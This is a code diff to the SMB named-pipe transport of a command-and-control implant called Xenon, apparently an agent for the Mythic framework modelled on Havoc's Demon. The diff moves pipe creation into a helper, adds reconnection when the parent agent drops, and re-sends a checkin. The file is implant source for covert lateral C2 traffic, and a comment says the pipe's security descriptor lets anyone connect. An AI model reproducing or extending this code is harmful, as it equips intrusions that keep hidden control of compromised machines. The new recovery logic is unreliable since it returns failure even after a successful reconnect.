@@ -7,6 +7,7 @@
 #include "Xenon.h"
 #include "Config.h"
 #include "Package.h"
+#include "Checkin.h"
 
 /* This file is the the Mythic SMB profile */
 #ifdef SMB_TRANSPORT
@@ -15,11 +16,6 @@
  * @brief Send data to SMB C2 Channel
  * 
  * @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
- * 
- * @note For SMB agents acting as links, SmbId MUST match the LinkId that the
- *       main agent expects. This ensures LinkPush() can properly verify messages.
- *       All packages sent by SMB agents (including queued chunks from Download, etc.)
- *       will have SmbId prepended via this function.
  * 
  * @return BOOL  
  */
@@ -39,42 +35,22 @@ BOOL SmbSend(PPackage package)
 	/* Not initialized Yet */
 	if ( !xenonConfig->SmbPipe )
 	{
-		SMB_PIPE_SEC_ATTR   SmbSecAttr   = { 0 };
-		SECURITY_ATTRIBUTES SecurityAttr = { 0 };
-
-		SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr );
-
-		xenonConfig->SmbPipe = CreateNamedPipeA(
-				xenonConfig->SmbPipename,		 // Named pipe string
-				PIPE_ACCESS_DUPLEX,              // read/write access
-				PIPE_TYPE_MESSAGE     |          // message type pipe
-				PIPE_READMODE_MESSAGE,           // message-read mode
-				// PIPE_WAIT,                    // blocking mode
-				PIPE_UNLIMITED_INSTANCES,        // max. instances
-				PIPE_BUFFER_MAX,                 // output buffer size
-				PIPE_BUFFER_MAX,                 // input buffer size
-				0,                               // client time-out
-				&SecurityAttr 					 // security attributes
-			);
-		
-		SmbSecurityAttrFree( &SmbSecAttr );
-
-		if ( !xenonConfig->SmbPipe )
-			goto END;
-
-
-		if ( !ConnectNamedPipe(xenonConfig->SmbPipe, NULL) )
-		{
-			CloseHandle(xenonConfig->SmbPipe);
-			goto END;
-		}
-
+        /* Create Named Pipe and connect to it */
+		if ( !SmbPipeCreate() )
+        {
+            _err("Failed to create SMB pipe. ERROR : %d", GetLastError());
+            goto END;
+        }
+			
 		/* Send the message to the named pipe */
-		if ( !PackageSendPipe(xenonConfig->SmbPipe, Send->buffer, Send->length) ) {
+		if ( !PackageSendPipe(xenonConfig->SmbPipe, Send->buffer, Send->length) )
+        {
             _err("Failed to send msg to pipe. ERROR : %d ", GetLastError());
+            goto END;
         }
 
         /* Skip to end */
+        Success = TRUE;
         goto END;
 	}
 
@@ -132,6 +108,31 @@ BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
 
     if ( !PackageReadPipe(xenonConfig->SmbPipe, ppOutData, pOutLen) )
     {
+        /* Parent Agent disconnected, recovering pipe */
+        if ( GetLastError() == ERROR_BROKEN_PIPE )
+        {
+            _dbg("Parent Agent disconnected, recovering pipe ...");\
+            
+            /* Tear down pipe and create completely new one */
+            DisconnectNamedPipe(xenonConfig->SmbPipe);
+            CloseHandle(xenonConfig->SmbPipe);
+            xenonConfig->SmbPipe = NULL;
+
+            if ( SmbPipeCreate() )
+            {
+                _dbg("Waiting for new parent to connect...");
+                
+                if ( !CheckinSend() )
+                {
+                    _err("Failed to send checkin request");
+                    return FALSE;
+                }
+            }
+
+            _err("Failed to create new SMB pipe");
+            return FALSE;
+        }
+        
         _err("Failed to read from pipe. ERROR : %d", GetLastError());
         return FALSE;
     }
@@ -141,6 +142,52 @@ BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
     return TRUE;
 }
 
+
+/**
+ * @brief Create a new SMB pipe and connect to it.
+ *
+ * @note ConnectNamedPipe WILL BLOCK until a client connects to the pipe.
+ * 
+ * @return BOOL - Success
+ */
+BOOL SmbPipeCreate()
+{
+    SMB_PIPE_SEC_ATTR   SmbSecAttr   = { 0 };
+    SECURITY_ATTRIBUTES SecurityAttr = { 0 };
+
+    SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr );
+
+    xenonConfig->SmbPipe = CreateNamedPipeA(
+            xenonConfig->SmbPipename,		 // Named pipe string
+            PIPE_ACCESS_DUPLEX,              // read/write access
+            PIPE_TYPE_MESSAGE     |          // message type pipe
+            PIPE_READMODE_MESSAGE,           // message-read mode
+            // PIPE_WAIT,                    // blocking mode
+            PIPE_UNLIMITED_INSTANCES,        // max. instances
+            PIPE_BUFFER_MAX,                 // output buffer size
+            PIPE_BUFFER_MAX,                 // input buffer size
+            0,                               // client time-out
+            &SecurityAttr 					 // security attributes
+        );
+    
+    SmbSecurityAttrFree( &SmbSecAttr );
+
+    if ( !xenonConfig->SmbPipe )
+    {
+        _err("Failed to create SMB pipe");
+        return FALSE;
+    }
+
+
+    if ( !ConnectNamedPipe(xenonConfig->SmbPipe, NULL) )
+    {
+        CloseHandle(xenonConfig->SmbPipe);
+        _err("Failed to connect to SMB pipe");
+        return FALSE;
+    }
+
+    return TRUE;
+}
 
 /**
  * @brief Initialize Security Descriptor to allow anyone to connect to namedpipe
